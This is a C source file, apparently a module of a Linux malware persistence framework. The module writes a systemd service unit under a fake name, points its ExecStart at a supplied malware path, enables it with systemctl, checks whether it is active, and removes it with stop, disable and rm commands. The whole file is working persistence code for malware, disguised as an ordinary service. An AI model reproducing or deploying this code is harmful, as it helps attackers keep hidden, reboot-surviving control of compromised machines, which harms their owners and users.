#pragma region RequiredLibraries

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include "../../headers/modules/module.h"
	#include "../../headers/helpers/helpers.h"
	#include "../../headers/errors.h"

#pragma endregion

#pragma region Configuration

	#define        SERVICE_UNIT_FILES_LOCATION       "/etc/systemd/system"
	#define        UNIT_FILE_EXTENSION               ".service"

	#define        UNIT_FILE_BUFFER_SIZE             256
	#define        UNIT_FILE_FORMAT                  "\n[Unit]\nDescription=%s service\n\n[Service]\nType=simple\n\nExecStart=%s\n\n[Install]\nWantedBy=multi-user.target\n"

	#define        COMMAND_BUFFER_SIZE               128
	#define        ENABLE_COMMAND_ENABLE_FORMAT      "systemctl enable %s"
	#define        CHECK_COMMAND_FORMAT              "service %s status | grep active -c"
	#define        REMOVE_COMMAND_FORMAT             "systemctl stop %s; systemctl disable %s; rm %s"

	#define        OUTPUT_IS_PRESENT                 "1\n"

#pragma endregion

#pragma region GlobalVariables

	char *unit_path = NULL;

#pragma endregion

#pragma region SharedObjectEvents

void __attribute__ ((destructor)) on_dlclose(void){

	if (unit_path != NULL)
		free(unit_path);

}

#pragma endregion

#pragma region ModuleMethods

extern int is_compatible(ENVIRONMENT *env){

	// Can be exploited only with root
	return env->is_root;

};

extern int exploit(ENVIRONMENT *env){

	char unit_content[UNIT_FILE_BUFFER_SIZE];
	char enable_command[COMMAND_BUFFER_SIZE];
	char *unit_filename = NULL;
	char *enable_command_output = NULL;

	// Get the path of the unit file
	copy_string(&unit_filename, env->fake_name, sizeof(UNIT_FILE_EXTENSION) + 1);
	strcat(unit_filename, UNIT_FILE_EXTENSION);
	concat_path_with_filename(&unit_path, SERVICE_UNIT_FILES_LOCATION, unit_filename);

	// Create the file
	sprintf(unit_content, UNIT_FILE_FORMAT, env->fake_name, env->malware_path);
	create_file(unit_path, unit_content);

	// Execute the command for service adding
	sprintf(enable_command, ENABLE_COMMAND_ENABLE_FORMAT, unit_filename);
	execute_command(enable_command, &enable_command_output);

	// Free
	free(unit_filename);
	free(enable_command_output);

	// Return
	return 0;

}

extern int is_installed(ENVIRONMENT *env){

	char check_command[COMMAND_BUFFER_SIZE];
	char *check_command_output = NULL;
	int ret_val = 0;

	// Execute the command for checking if the service is enabled
	sprintf(check_command, CHECK_COMMAND_FORMAT, env->fake_name);
	execute_command(check_command, &check_command_output);

	// Check the output of the command
	ret_val = (strcmp(check_command_output, OUTPUT_IS_PRESENT) == 0) ? 1 : 0;
	if (check_command_output)
		free(check_command_output);
	
	// Return
	return ret_val;

}

extern int delete_installed(ENVIRONMENT *env){

	char remove_command[COMMAND_BUFFER_SIZE];
	char *remove_command_output = NULL;

	// Execute the command for removing the service
	sprintf(remove_command, REMOVE_COMMAND_FORMAT, env->fake_name, env->fake_name, unit_path);
	execute_command(remove_command, &remove_command_output);
	if (remove_command_output != NULL)
		free(remove_command_output);

	// Return
	return 0;

}

#pragma endregion